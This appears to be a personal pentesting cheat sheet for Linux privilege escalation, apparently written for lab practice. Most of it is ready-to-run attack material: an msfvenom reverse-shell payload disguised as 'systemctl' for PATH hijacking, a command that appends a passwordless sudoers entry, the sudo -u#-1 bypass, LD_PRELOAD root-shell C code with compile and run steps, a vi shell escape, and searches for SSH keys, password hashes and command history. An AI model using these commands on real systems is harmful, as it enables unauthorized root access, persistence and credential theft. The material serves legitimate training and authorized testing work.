
Things to check for;
- OS and kernel version for exploits
- List current processes 
- Other users home directory (for SSH keys or .bash_history)
- Sudo privileges
- Configuration files
- Shadow and passwd file for hashes
- Cron jobs
- File systems and drives (command = lsblk)
- SETUID and SETDI permissions
- Writable files (find / -writable -type f 2>/dev/null)
- Writable directories (find / -writable -type d 2>/dev/null)
- Password reuse

Environment Variables
```
env
```
Are there any executables run by root for which full path has not be specified and we can abuse by placing a . in the current directory and abuse by creating the same file? for example systemctl /usr/bin/systemctl
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=443 -a x64 -f elf -o systemctl
```
```
chmod 755 ./systemctl
```
```
echo 'echo "devops ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /dev/shm/systemctl
```

Login Shells
```
cat /etc/shells
```
- tmux and screen lead to privesc

Hidden files and directories
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
find / -type d -name ".*" -ls 2>/dev/null
find | grep local.txt
find / -iname local.txt* -type f 2>/dev/null
find ~/ -type f -name "config.yml"
```

View command history
```
cat ~/.bash_history
```

Sudo <v1.28
```
sudo -u#-1 /bin/bash
```

sudo-l LD_PRELOAD 
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Compile
```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
Run sudo command, example:
```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

If cat or command is not found
![[Pasted image 20260416131200.png]]

Compiling File
```
i686-w64-mingw32-gcc -o [file].exe [file].c -lws2_32
```

Pip3
```
python3 -m venv pwnenv
source pwnenv/bin/activate
pip install --upgrade pip
pip install pwntools
```

Shell with sudo vi
After opening prompt type
```
:set shell=/bin/sh
(enter)
:shell
(enter)
```

sudo apt-get update --fix-missing
sudo apt-get --fix-broken install
sudo apt-get full-upgrade -y